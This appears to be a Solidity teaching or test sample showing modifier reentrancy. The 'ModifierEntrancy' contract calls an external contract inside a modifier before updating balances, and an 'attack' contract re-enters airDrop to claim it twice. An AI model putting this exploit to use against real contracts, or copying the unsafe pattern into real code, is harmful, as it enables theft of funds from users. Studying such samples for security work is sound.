pragma solidity ^0.4.24;

contract ModifierEntrancy {
  mapping (address => uint) public tokenBalance;
  string constant name = "Nu Token";

  function airDrop() hasNoBalance supportsToken  public{
    tokenBalance[msg.sender] += 20;
  }

  modifier supportsToken() {
    bytes32 tokenHash = keccak256(abi.encodePacked("Nu Token"));
    require(tokenHash == Bank(msg.sender).supportsToken());
    _;
  }
   
  modifier hasNoBalance {
      uint balance = tokenBalance[msg.sender];
      require(balance == 0);
      _;
  }
}

contract Bank{
    function supportsToken() external pure returns(bytes32){
        bytes32 tokenHash = keccak256(abi.encodePacked("Nu Token"));
        return(tokenHash);
    }
}

contract attack{  
    bool hasBeenCalled;
    function supportsToken() external returns(bytes32){
        if(!hasBeenCalled){
            hasBeenCalled = true;
            ModifierEntrancy(msg.sender).airDrop();
        }
        bytes32 tokenHash = keccak256(abi.encodePacked("Nu Token"));
        return(tokenHash);
    }
    function call(address token) public{
        ModifierEntrancy(token).airDrop();
    }
}